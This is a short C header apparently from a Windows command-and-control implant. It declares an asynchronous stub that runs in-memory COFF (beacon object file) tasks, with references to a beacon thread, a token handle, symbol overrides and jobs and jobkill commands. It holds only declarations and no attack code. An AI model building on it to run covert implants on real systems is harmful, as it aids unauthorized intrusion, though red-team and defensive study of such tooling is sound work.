#pragma once
#ifndef ASYNCSTUB_H
#define ASYNCSTUB_H

#include <windows.h>
#include "Config.h"
#include "Tasks/InlineExecute.h"

#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)

typedef struct _ASYNC_STUB_CTX ASYNC_STUB_CTX;

#define ASYNC_STUB_MAX_OVERRIDES 32

ASYNC_STUB_CTX *AsyncStubCreate(
    const void *args,
    UINT32 argsSize,
    HANDLE hStop,
    HANDLE hWake,
    HANDLE hBeaconThread,
    HANDLE hToken);

VOID  AsyncStubDestroy(ASYNC_STUB_CTX *c);
VOID  AsyncStubSetEntry(ASYNC_STUB_CTX *c, void (*entry)(char *, UINT32));
LPTHREAD_START_ROUTINE AsyncStubThreadProcAddr(ASYNC_STUB_CTX *c);
LONG  AsyncStubGetState(ASYNC_STUB_CTX *c);
INT   AsyncStubDrain(ASYNC_STUB_CTX *c, char **out);
BOOL  AsyncStubFillOverrides(ASYNC_STUB_CTX *c, COFF_SYM_OVERRIDE *ov, int maxOv, int *count);

#endif

#endif
